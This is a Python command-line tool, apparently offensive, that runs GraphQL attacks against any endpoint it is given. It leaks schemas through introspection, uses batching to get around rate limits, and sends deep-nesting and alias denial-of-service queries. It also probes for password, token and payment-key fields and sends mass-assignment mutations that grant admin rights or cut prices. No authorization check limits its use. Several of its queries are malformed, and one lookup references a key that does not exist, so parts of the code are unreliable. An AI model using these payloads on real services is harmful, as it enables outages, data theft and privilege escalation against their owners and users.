#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GraphQL Attack Engine v2 — Introspecção avançada, batching, DoS, injeção, mass assignment
Version: 2.1
"""
import sys
import os
import json
import time
import re
import argparse
import urllib.request
import urllib.error
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

VERSION = "2.1"
LOG_DIR = Path(__file__).parent / "log"
LOG_DIR.mkdir(exist_ok=True)

# ============================================================================
# Advanced GraphQL Introspection Queries
# ============================================================================
INTROSPECTION_QUERIES = {
    "schema_basic": '{"query":"{__schema{types{name}}}"}',
    "schema_full": '{"query":"{__schema{types{name fields{name type{name}}}}}"}',
    "query_type": '{"query":"{__schema{queryType{name}}}"}',
    "mutation_type": '{"query":"{__schema{mutationType{name}}}"}',
    "directives": '{"query":"{__schema{directives{name locations args{name type{name}}}}}"}',
    "types_list": '{"query":"{__schema{types{name}}}"}',
    "type_def": lambda type_name: f'{{__type(name:"{type_name}"){{name fields{{name type{{name}}}}}}}}',
    "all_types": '{"query":"{__schema{types{name fields{name type{{name}}}}}}"}',
    "schema_with_desc": '{"query":"{__schema{types{name description fields{name description type{{name kind}}}}}"}',
    "input_types": '{"query":"{__schema{types{name kind inputFields{{name type{{name kind}}}}}}}"}}',
    "enum_values": '{"query":"{__schema{types{name kind enumValues{{name description}}}}}"}}',
    "directive_defs": '{"query":"{__schema{directives{name description args{{name type{{name}}}} locations}}}"}',
    "subscription_type": '{"query":"{__schema{subscriptionType{name fields{{name type{{name}}}}}}}"}',
    "type_hierarchy": lambda name: f'{{__type(name:"{name}"){{name kind interfaces{{name}} possibleTypes{{name}}}}}}',
    "all_possible_types": '{"query":"{__schema{types{name kind}}}"}',
}

# ============================================================================
# Attack Payloads
# ============================================================================
GRAPHQL_ATTACKS = {
    "introspection_leak": {
        "description": "Extract full schema for reconnaissance",
        "query": '{"query":"{__schema{types{name fields{name type{{name}}}}}}"}',
    },
    "batch_query": {
        "description": "Batch query to bypass rate limits and extract multiple resources",
        "query": lambda count=10: _batch_query(count),
    },
    "deep_nesting_dos": {
        "description": "Deep nesting DoS — forces server to resolve exponentially",
        "query": '{"query":"{users{id friends{id friends{id friends{id friends{id name}}}}}}}"}',
    },
    "alwaystrue_injection": {
        "description": "Boolean injection via GraphQL operators",
        "query": '{"query":"{users(where:{username:{startsWith:\\"^"}}){id username}}"}',
    },
    "union_type_traversal": {
        "description": "Union type field traversal",
        "query": '{"query":"{search(first:10){__typename ... on User{id name} ... on Post{id title}}}}"}',
    },
    "fragment_spread_abuse": {
        "description": "Fragment spread for field extraction",
        "query": '{"query":"query($id:ID!){user(id:$id){...UserFields}} fragment UserFields on User{id email password role}"}',
    },
    "variable_injection": {
        "description": "GraphQL variable injection",
        "query": '{"query":"query($input:UserInput!){login(input:$input){token user{id email}}}", "variables":{"input":{"username":"admin","password":"anything"}}}',
    },
    "nested_mutation_dos": {
        "description": "Nested mutation DoS",
        "query": '{"mutation{createUser(input:{name:"x",posts:{create:{title:"x",comments:{create:{text:"x",replies:{create:{text:"x"}}}}}}}){id}}}",',
    },
    "introspection_fields": {
        "description": "Extract all fields from a specific type",
        "query": lambda type_name="User": f'{{__type(name:"{type_name}"){{name fields{{name type{{name}}}}}}}}',
    },
    "introspection_enums": {
        "description": "Extract all enum values",
        "query": '{"query":"{__schema{types{name kind enumValues{name}}}"}',
    },
    "introspection_inputs": {
        "description": "Extract input types",
        "query": '{"query":"{__schema{types{name kind inputFields{{name type{{name}}}}}}}"}',
    },
    # New v2 attacks
    "mass_assignment_user": {
        "description": "Mass assignment — add admin role via mutation",
        "query": '{"mutation{$updateUser(id:"1"){updateUserInput:{role:"admin",isAdmin:true,isBanned:false}}){user{id role isAdmin}}}}',
    },
    "mass_assignment_price": {
        "description": "Mass assignment — modify price to 0.01",
        "query": '{"mutation{$updateProduct(id:"1"){updateProductInput:{price:0.01,originalPrice:999.99}}){product{id price}}}}',
    },
    "fragment_injection": {
        "description": "Inject fragments to extract sensitive fields",
        "query": '{"query":"query GetUser($id:ID!){user(id:$id){id name email ...SensitiveFields}} fragment SensitiveFields on User{password secret token role}"}',
    },
    "introspection_directive_leak": {
        "description": "Extract directives to find @skip/@if patterns",
        "query": '{"query":"{__schema{directives{name locations args{name type{{name}}}}}"}',
    },
    "type_introspection_bypass": {
        "description": "Probe type introspection when __schema is blocked",
        "query": '{"query":"{__type(name:\"Query\"){{name fields{{name}}}}}"}',
    },
    "deep_query_dos_v2": {
        "description": "Configurable depth DoS via variable",
        "query": '{"query":"query($depth:Int!){users(first:$depth){id friends(first:$depth){id friends(first:$depth){id name}}}}}","variables":{"depth":50}}',
    },
    "batch_exploit": {
        "description": "Aggressive batching for rate limit bypass",
        "query": lambda count=20: json.dumps([{"query": "{users{id}}"}] * count),
    },
    "sensitive_field_probing": {
        "description": "Probe for sensitive fields in common types",
        "query": '{"query":"{users(first:1){id name email phone password token role isAdmin secret}}"}',
    },
    "alias_dos": {
        "description": "Alias-based DoS — many aliases for same expensive field",
        "query": '{"query":"{a1:users{id} a2:users{id} a3:users{id} a4:users{id} a5:users{id} a6:users{id} a7:users{id} a8:users{id} a9:users{id} a10:users{id}}"}',
    },
    "introspection_schema_integrity": {
        "description": "Check schema for dangerous types (Upload, File, etc.)",
        "query": '{"query":"{__schema{types{name kind}}"}',
    },
    "batch_variable_injection": {
        "description": "Batch with variable injection",
        "query": '[{"query":"query($id:ID!){user(id:$id){id}}","variables":{"id":"1"}},{"query":"query($id:ID!){user(id:$id){id}}","variables":{"id":"2"}}]',
    },
    "complex_fragment_chain": {
        "description": "Chain fragments to extract nested sensitive data",
        "query": '{"query":"query($id:ID!){user(id:$id){...UserBase ...UserSensitive}} fragment UserBase on User{id name email} fragment UserSensitive on User{password resetToken stripeKey}}"}',
    },
}


def _batch_query(count: int = 10) -> str:
    """Generate batch query string."""
    items = ['{"query":"{users{id}}"}'] * count
    return "[" + " ".join(items) + "]"


class GraphQLAttackEngine:
    """GraphQL attack engine with advanced introspection, batching, DoS, and injection."""

    SENSITIVE_FIELD_PATTERNS = [
        r"password", r"passwd", r"pin", r"secret", r"token", r"key",
        r"ssn", r"credit", r"card", r"address", r"birth", r"gender",
        r"email", r"phone", r"role", r"admin", r"isAdmin", r"stripe",
        r"resetToken", r"refreshToken", r"apiKey", r"api_key",
    ]

    SENSITIVE_TYPE_NAMES = [
        "User", "Account", "Customer", "Member", "Admin", "Payment",
        "Order", "Transaction", "Profile", "Credential", "Session",
    ]

    def __init__(self, headers: Optional[Dict] = None, timeout: int = 10):
        self.headers = headers or {}
        self.timeout = timeout
        self.results: List[Dict] = []
        self.endpoint: Optional[str] = None
        self.schema: Optional[Dict] = None
        self.queries: List[str] = []
        self.mutations: List[str] = []
        self.types_map: Dict[str, Dict] = {}

    def set_endpoint(self, url: str):
        self.endpoint = url

    def _request(
        self, query: str, variables: Optional[Dict] = None
    ) -> Dict:
        """Send GraphQL request."""
        if not self.endpoint:
            return {"error": "No endpoint set"}

        payload: Dict[str, Any] = {"query": query}
        if variables:
            payload["variables"] = variables

        data = json.dumps(payload).encode("utf-8")
        req_headers = {
            "Content-Type": "application/json",
            "Accept": "application/json",
            **self.headers,
        }

        try:
            req = urllib.request.Request(
                self.endpoint,
                data=data,
                headers=req_headers,
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                body = resp.read().decode("utf-8")
                return json.loads(body)
        except urllib.error.HTTPError as e:
            return {"error": f"HTTP {e.code}", "body": e.read().decode()[:500]}
        except json.JSONDecodeError as e:
            return {"error": f"JSON parse error: {e}"}
        except Exception as e:
            return {"error": str(e)}

    # -------------------------------------------------------------------------
    # Introspection
    # -------------------------------------------------------------------------
    def test_introspection(self) -> Dict:
        """Test if introspection is enabled."""
        result = self._request(INTROSPECTION_QUERIES["schema_basic"])
        has_schema = "data" in result and "__schema" in result.get("data", {})
        return {
            "endpoint": self.endpoint,
            "introspection_enabled": has_schema,
            "result": result,
        }

    def extract_schema(self) -> Dict:
        """Extract full schema via introspection."""
        result = self._request(INTROSPECTION_QUERIES["schema_full"])
        if "data" in result and "__schema" in result["data"]:
            self.schema = result["data"]["__schema"]
            # Build type map for quick lookup
            for type_def in self.schema.get("types", []):
                tname = type_def.get("name", "")
                if not tname.startswith("__"):
                    self.types_map[tname] = type_def

            # Extract queries and mutations
            query_type = self.schema.get("queryType", {}).get("name", "Query")
            mutation_type = self.schema.get("mutationType", {}).get("name", "Mutation")

            self.queries = []
            self.mutations = []
            for td in self.schema.get("types", []):
                if td.get("name") == query_type:
                    self.queries = [f["name"] for f in td.get("fields", [])]
                elif td.get("name") == mutation_type:
                    self.mutations = [f["name"] for f in td.get("fields", [])]

            return {
                "success": True,
                "types": len(self.schema.get("types", [])),
                "queries": len(self.queries),
                "mutations": len(self.mutations),
                "query_names": self.queries[:20],
                "mutation_names": self.mutations[:20],
                "schema": self.schema,
            }
        return {"success": False, "result": result}

    def find_queries(self) -> List[str]:
        """Extract all query names from schema."""
        return list(self.queries)

    def find_mutations(self) -> List[str]:
        """Extract all mutation names from schema."""
        return list(self.mutations)

    def find_sensitive_fields(self, type_name: str) -> List[Dict]:
        """Find sensitive fields in a type using pattern matching."""
        type_def = self.types_map.get(type_name)
        if not type_def:
            return []

        results = []
        for field in type_def.get("fields", []):
            field_name = field.get("name", "").lower()
            if any(re.search(p, field_name, re.IGNORECASE) for p in self.SENSITIVE_FIELD_PATTERNS):
                results.append(field)
        return results

    def scan_all_sensitive_types(self) -> Dict:
        """Scan all common sensitive types for exposed fields."""
        findings = {}
        for type_name in self.SENSITIVE_TYPE_NAMES:
            if type_name in self.types_map:
                fields = self.find_sensitive_fields(type_name)
                if fields:
                    findings[type_name] = [f["name"] for f in fields]
        return findings

    # -------------------------------------------------------------------------
    # Attack methods
    # -------------------------------------------------------------------------
    def run_batch_attack(
        self, query_name: str, count: int = 10
    ) -> Dict:
        """Run batch query attack against a specific query."""
        batch = [{"query": f'{{ {query_name} {{ id }} }}'}] * count
        result = self._request(json.dumps(batch))
        return {
            "type": "batch",
            "query": query_name,
            "count": count,
            "result": result,
        }

    def run_deep_dos(self, depth: int = 10) -> Dict:
        """Run configurable depth DoS test."""
        # Build deeply nested query
        nested = "users"
        for _ in range(depth):
            nested += "{id friends"
        nested += "{id name}}" * depth
        query = f'{{ {nested} }}'
        start = time.time()
        result = self._request(query)
        elapsed = time.time() - start
        return {
            "type": "dos",
            "depth": depth,
            "elapsed_sec": round(elapsed, 2),
            "result": result,
        }

    def run_alias_dos(self, count: int = 10) -> Dict:
        """Run alias-based DoS."""
        aliases = "".join(f'a{i}:users{{id}} ' for i in range(1, count + 1))
        query = f'{{ {aliases} }}'
        start = time.time()
        result = self._request(query)
        elapsed = time.time() - start
        return {
            "type": "alias_dos",
            "alias_count": count,
            "elapsed_sec": round(elapsed, 2),
            "result": result,
        }

    def run_fragment_injection(self) -> Dict:
        """Try fragment injection to extract sensitive fields."""
        result = self._request(GRAPHQL_ATTACKS["fragment_injection"]["query"])
        errors = result.get("errors", [])
        has_data = "data" in result
        return {
            "type": "fragment_injection",
            "has_data": has_data,
            "errors": errors,
            "result": result,
        }

    def run_mass_assignment_probe(self) -> Dict:
        """Probe for mass assignment vulnerabilities."""
        results = []
        for attack_key in ["mass_assignment_user", "mass_assignment_price"]:
            query = GRAPHQL_ATTACKS[attack_key]["query"]
            if callable(query):
                query = query()
            result = self._request(query)
            # Check if the mutation succeeded (no errors, has data)
            has_err = "errors" in result
            results.append({
                "attack": attack_key,
                "description": GRAPHQL_ATTACKS[attack_key]["description"],
                "blocked": has_err,
                "result": result,
            })
        return {"type": "mass_assignment", "probes": results}

    def run_introspection_bypass_test(self) -> Dict:
        """Test if __schema is blocked but __type is accessible."""
        r1 = self._request(INTROSPECTION_QUERIES["schema_basic"])
        r2 = self._request(INTROSPECTION_QUERIES["type_introspection_bypass"])
        schema_blocked = "__schema" not in r1.get("data", {})
        type_accessible = "__type" in r2.get("data", {})
        return {
            "type": "introspection_bypass",
            "schema_blocked": schema_blocked,
            "type_accessible": type_accessible,
            "bypass_possible": schema_blocked and type_accessible,
        }

    def run_all_tests(self) -> Dict:
        """Run comprehensive GraphQL attack suite."""
        tests = []

        # 1. Introspection check
        intro = self.test_introspection()
        tests.append({"name": "introspection_check", "result": intro})

        if not intro.get("introspection_enabled"):
            # Try bypass
            bypass = self.run_introspection_bypass_test()
            tests.append({"name": "introspection_bypass", "result": bypass})
            if not bypass.get("bypass_possible"):
                tests.append({"name": "skip_remaining", "result": {"reason": "Introspection fully disabled"}})
                return {"endpoint": self.endpoint, "tests": tests}
            # If bypass works, extract schema manually
            self.extract_schema()

        # 2. Extract schema
        schema_result = self.extract_schema()
        tests.append({"name": "schema_extraction", "result": schema_result})

        if not schema_result.get("success"):
            return {"endpoint": self.endpoint, "tests": tests}

        # 3. List queries and mutations
        tests.append({"name": "queries_found", "result": {"queries": self.queries[:30]}})
        tests.append({"name": "mutations_found", "result": {"mutations": self.mutations[:30]}})

        # 4. Scan sensitive types
        sensitive = self.scan_all_sensitive_types()
        tests.append({
            "name": "sensitive_types_scan",
            "result": {"findings": sensitive},
        })

        # 5. Batch attack test
        batch_result = self.run_batch_attack("users" if self.queries else "query", count=5)
        tests.append({"name": "batch_attack", "result": batch_result})

        # 6. DoS tests (light)
        dos_result = self.run_deep_dos(depth=5)
        tests.append({"name": "deep_dos_test", "result": dos_result})

        alias_result = self.run_alias_dos(count=5)
        tests.append({"name": "alias_dos_test", "result": alias_result})

        # 7. Fragment injection
        frag_result = self.run_fragment_injection()
        tests.append({"name": "fragment_injection", "result": frag_result})

        # 8. Mass assignment
        ma_result = self.run_mass_assignment_probe()
        tests.append({"name": "mass_assignment_probe", "result": ma_result})

        return {"endpoint": self.endpoint, "tests": tests}


# ============================================================================
# CLI Interface
# ============================================================================
def main():
    parser = argparse.ArgumentParser(
        description=f"GraphQL Attack Engine v{VERSION}"
    )
    parser.add_argument("endpoint", help="GraphQL endpoint URL")
    parser.add_argument("--test", "-t", action="store_true", help="Run all tests")
    parser.add_argument("--schema", "-s", action="store_true", help="Extract schema")
    parser.add_argument("--queries", "-q", action="store_true", help="List queries")
    parser.add_argument("--mutations", "-m", action="store_true", help="List mutations")
    parser.add_argument("--sensitive", "-S", metavar="TYPE", help="Find sensitive fields in type")
    parser.add_argument("--dos", "-d", action="store_true", help="DoS test")
    parser.add_argument("--dos-depth", type=int, default=5, help="DoS nesting depth")
    parser.add_argument("--batch", "-b", metavar="QUERY", help="Batch query test")
    parser.add_argument("--batch-count", "-B", type=int, default=10, help="Batch size")
    parser.add_argument("--fragment", "-F", action="store_true", help="Fragment injection test")
    parser.add_argument("--mass-assign", "-M", action="store_true", help="Mass assignment probe")
    parser.add_argument("--headers", "-H", nargs="*", help="Custom headers (key:value)")
    parser.add_argument("--json", "-j", action="store_true", help="JSON output")

    args = parser.parse_args()

    engine = GraphQLAttackEngine()
    if args.headers:
        for h in args.headers:
            if ":" in h:
                k, v = h.split(":", 1)
                engine.headers[k.strip()] = v.strip()
    engine.set_endpoint(args.endpoint)

    if args.test:
        result = engine.run_all_tests()
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print(f"\nGraphQL Attack Results for {args.endpoint}")
            print("=" * 60)
            for test in result.get("tests", []):
                r = test["result"]
                if test["name"] == "skip_remaining":
                    status = "SKIP"
                elif r.get("success") or r.get("introspection_enabled") or r.get("bypass_possible"):
                    status = "PASS"
                elif r.get("blocked") is False or r.get("has_data"):
                    status = "WARNING"
                else:
                    status = "FAIL"
                print(f"  [{status}] {test['name']}")
                if r.get("queries"):
                    print(f"        Queries: {', '.join(r['queries'][:10])}")
                if r.get("mutations"):
                    print(f"        Mutations: {', '.join(r['mutations'][:10])}")
                if r.get("findings"):
                    for t, fields in r["findings"].items():
                        print(f"        [{t}] sensitive: {', '.join(fields)}")
                if r.get("depth") is not None:
                    print(f"        Depth: {r['depth']} | Time: {r.get('elapsed_sec', '?')}s")
        return

    if args.schema:
        result = engine.extract_schema()
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            if result.get("success"):
                print(f"  Types: {result.get('types')}")
                print(f"  Queries: {result.get('queries')}")
                print(f"  Mutations: {result.get('mutations')}")
                print(f"  Query names: {', '.join(result.get('query_names', []))}")
                print(f"  Mutation names: {', '.join(result.get('mutation_names', []))}")
            else:
                print(f"  Failed: {result}")
        return

    if args.queries:
        if not engine.schema:
            engine.extract_schema()
        queries = engine.find_queries()
        print(f"Queries ({len(queries)}):")
        for q in queries:
            print(f"  - {q}")
        return

    if args.mutations:
        if not engine.schema:
            engine.extract_schema()
        mutations = engine.find_mutations()
        print(f"Mutations ({len(mutations)}):")
        for m in mutations:
            print(f"  - {m}")
        return

    if args.sensitive:
        if not engine.schema:
            engine.extract_schema()
        fields = engine.find_sensitive_fields(args.sensitive)
        print(f"Sensitive fields in {args.sensitive} ({len(fields)}):")
        for f in fields:
            print(f"  - {f['name']}: {f.get('type', {})}")
        return

    if args.dos:
        result = engine.run_deep_dos(depth=args.dos_depth)
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print(f"  DoS test: depth={result['depth']}, time={result['elapsed_sec']}s")
            err = result["result"].get("errors", [])
            if err:
                print(f"  Errors: {err}")
        return

    if args.batch:
        result = engine.run_batch_attack(args.batch, args.batch_count)
        print(json.dumps(result, indent=2, default=str))
        return

    if args.fragment:
        result = engine.run_fragment_injection()
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print(f"  Fragment injection: {'HAS DATA' if result['has_data'] else 'BLOCKED'}")
            if result["errors"]:
                print(f"  Errors: {result['errors']}")
        return

    if args.mass_assign:
        result = engine.run_mass_assignment_probe()
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            for probe in result["probes"]:
                status = "BLOCKED" if probe["blocked"] else "VULNERABLE"
                print(f"  [{status}] {probe['description']}")
        return

    parser.print_help()


if __name__ == "__main__":
    main()
